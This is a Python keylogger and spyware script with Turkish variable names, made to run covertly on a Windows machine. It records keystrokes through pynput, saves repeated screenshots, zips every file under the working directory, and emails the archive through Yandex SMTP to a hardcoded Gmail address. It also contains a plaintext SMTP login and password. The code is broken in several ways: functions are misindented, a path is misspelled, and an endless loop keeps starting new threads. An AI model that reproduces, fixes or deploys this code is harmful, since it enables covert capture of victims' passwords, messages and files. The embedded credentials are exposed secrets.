from pynput.keyboard import Listener,Key
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication
import smtplib
import os
import time
import pyautogui
import glob
import zipfile
import schedule
import threading
p=1


def ss():
    global p
    print(p)
    x="Screenshot"+str(p)+".png"
    ss=pyautogui.screenshot()
    ss.save(x)
    p=p+1
    time.sleep(5)
    pass

    liste = list()
    cpdurum = False
    shdurum = False
    gr_durum = False
    
    gr_liste = ["}",">","£","#","$","½","","{","[","]"]
    shliste = ["=","!","'","^","+","%","&","/","(",")"]
    rakam = "0123456789"
    
def main():
        
    def bas(key):
    
        global liste,cpdurum,shdurum,gr_durum
    
        try:
    
            if shdurum:
    
                if key.char in rakam:
    
                    liste.append(shliste[int(key.char)])
    
                else:
    
                    if key.char == "*":
    
                        liste.append("?")
    
                    elif key.char == "-":
    
                        liste.append("_")
    
                    elif not cpdurum:
    
                        liste.append(key.char.upper())
    
                    else:
    
                        liste.append(key.char)
    
    
    
            elif gr_durum:
    
                if key.char in rakam:
    
                    liste.append(gr_liste[int(key.char)])
    
                else:
    
                    if key.char == "*":
    
                        liste.append("\\")
    
                    if key.char == "-":
    
                        liste.append("|")
    
                    if key.char == "q":
    
                        liste.append("@")
    
    
    
    
            elif cpdurum:
    
                liste.append(key.char.upper())
    
            else:
    
                liste.append(key.char)
    
        except AttributeError:
    
            if key ==  Key.space:
    
                liste.append(" ")
    
            if key == Key.enter:
    
                liste.append("\n")
    
            if key == Key.backspace:
    
                liste.append("'<-'")
    
    
            if key == Key.caps_lock:
    
                cpdurum = not cpdurum
    
            if key == Key.shift_r or key == Key.shift_l:
    
                shdurum = True
    
            if key == Key.alt_gr:
    
                gr_durum = True
    
    
    
        if len(liste) >= 30:
    
            dosya_yaz()
    
            liste = list()
    
    
        
        def birak(key):
    
            global shdurum,gr_durum
    
            if key == Key.shift_l or key == Key.shift_r:
    
                shdurum = False
    
            if key == Key.alt_gr:
    
                gr_durum = False
    
        time.sleep(15)

        
    
    
        with Listener(on_press=bas,on_release=birak) as listener:
    
            listener.join()
            
    def ziple():
        arsivlenecekDosyalar=[]
        for belge in glob.iglob("**/*", recursive=True):
          arsivlenecekDosyalar.append(belge)
        with zipfile.ZipFile("arsiv.zip", "w") as arsiv:
          for dosya in arsivlenecekDosyalar:
            arsiv.write(dosya)
    
    def mail_gonder():
    
        while 1:
    
    
            time.sleep(30)
    
            username = os.getlogin()
    
            konum = "C:/Users/"+username+"/Destkop/keylogger/system-info-78.txt"
    
            try:
                if os.path.getsize(konum) >= 60:
    
                    with open(konum,"r",encoding = "utf-8") as file:
    
                        msg = MIMEMultipart()
                        body_part = MIMEText("Acıklama", 'plain')
                        msg['Subject'] = "keylogger"
                        msg['From'] = "ars-grup.engineering@yandex.com"
                        msg['To'] = "ysarslanturk@gmail.com"
                        # Add body to email
                        msg.attach(body_part)
                        # open and read the file in binary
                        with open("C:/Users/YSARS/Desktop/keylogger",'rb') as file:
                        # Attach the file with filename to the email
                            msg.attach(MIMEApplication(file.read(), Name='arsiv.zip'))
                    
                        # Create SMTP object
                        smtp_obj = smtplib.SMTP("smtp.yandex.com", "587")
                        # Login to the server
                        smtp_obj.login("ars-grup.engineering@yandex.com", "tvxqdpobklrnbifw")
                    
                        # Convert the message to a string and send it
                        smtp_obj.sendmail(msg['From'], msg['To'], msg.as_string())
                        smtp_obj.quit()
                        
                        os.remove(konum)
    
            except:
    
                pass
    
while True:
    t=threading.Thread(target=ss)
    t.start()
    t1=threading.Thread(target=main)
    t1.start()